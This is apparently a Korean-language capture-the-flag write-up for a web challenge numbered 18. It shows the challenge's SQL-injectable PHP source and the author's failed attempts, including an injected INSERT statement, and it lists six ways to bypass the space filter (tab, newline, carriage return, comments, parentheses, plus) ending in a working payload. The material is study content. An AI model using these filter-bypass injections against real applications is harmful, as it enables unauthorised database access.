# 18

### First impression
```
SQL INJECTION
```

```html
<html> 
<head> 
<title>Challenge 18</title> 
<style type="text/css"> 
body { background:black; color:white; font-size:10pt; } 
input { background:silver; } 
a { color:lightgreen; } 
</style> 
</head> 
<body> 
<br><br> 
<center><h1>SQL INJECTION</h1> 
<form method=get action=index.php> 
<table border=0 align=center cellpadding=10 cellspacing=0> 
<tr><td><input type=text name=no></td><td><input type=submit></td></tr> 
</table> 
</form> 
<a style=background:gray;color:black;width:100;font-size:9pt;><b>RESULT</b><br> 
<? 
if($_GET[no]) 
{ 

if(eregi(" |/|\(|\)|\t|\||&|union|select|from|0x",$_GET[no])) exit("no hack"); 

$q=@mysql_fetch_array(mysql_query("select id from challenge18_table where id='guest' and no=$_GET[no]")); 

if($q[0]=="guest") echo ("hi guest"); 
if($q[0]=="admin") 
{ 
@solve(); 
echo ("hi admin!"); 
} 

} 

?> 
</a> 
<br><br><a href=index.phps>index.phps</a> 
</cener> 
</body> 
</html> 
```

* `?no=` 파라미터로 SQLi를 넘겨서 `admin`이 나타나야 통과한다.

### Trial and error
```php
if(eregi(" |/|\(|\)|\t|\||&|union|select|from|0x",$_GET[no])) exit("no hack"); 

$q=@mysql_fetch_array(mysql_query("select id from challenge18_table where id='guest' and no=$_GET[no]")); 
```
* `AND` 연산은 `OR` 연산보다 높은 우선순위이기에 다음과 같이 SQL Injection을 시도한다.
	- `select id from challenge18_table where id='guest' and no='' or id='admin'`
	- `'' or id='admin'`
	- `''%20or%20id='admin'`
	- `''%09or%09id='admin'`
	- `'2'%09or%09id='admin'`
* 아무런 결과도 뜨지 않는다. 즉, `guest`도 `admin`도 아닌 다른 결과가 나왔거나, 결과가 뜨지 않았다는 것이다.
* `id=1` 외에는 값이 뜨지 않는다. 직접 `admin` 값을 넣어봐야 할 것 같다.
	- `select id from challenge18_table where id='guest' and no='';insert into challenge18_table(no, id) values('2','admin')`
	- `'';insert+into+challenge18_table(no, id)+values('2','admin')`
	- `'';insert+into+challenge18_table%28no,id%29+values%28'2','admin'%29`
* 결국 솔루션을 찾아봤다...

### Solution
* `no`가 `1`만 있는게 아니라 `2`도 있을 수 있다.
* `and` 연산자가 `or` 연산자보다 더 높은 우선순위에 있으므로, `false and false or true = true`와 같은 참값 유도를 해야 한다.
* `eregi()`로 띄어쓰기가 걸러지므로, 이를 우회할 방법을 찾아야 한다. [참고](http://binaryu.tistory.com/31)
	1. Tab : `%09`
		- `no=1%09or%09id='admin'`
	2. Line Feed (`\n`): `%0a`
		- `no=1%0aor%0aid='admin'`
	3. Carrage Return(`\r`) : `%0d`
		- `no=1%0dor%0did='admin'`
	4. 주석 : `/**/`
		- `no=1/**/or/**/id='admin'`
	5. 괄호 : `()`
		- `no=(1)or(id='admin')`
	6. 더하기 : `+`
		- `no=1+or+id='admin'`
* `0%0aor%0ano=2`을 브라우저 url 상에서 파라미터로 넘겨준다.

* 너무 조급하게 생각하여 이런 난이도로 솔루션을 찾아봤다. 조금 더 느긋하고 꼼꼼하게 고민해야 할 것이다.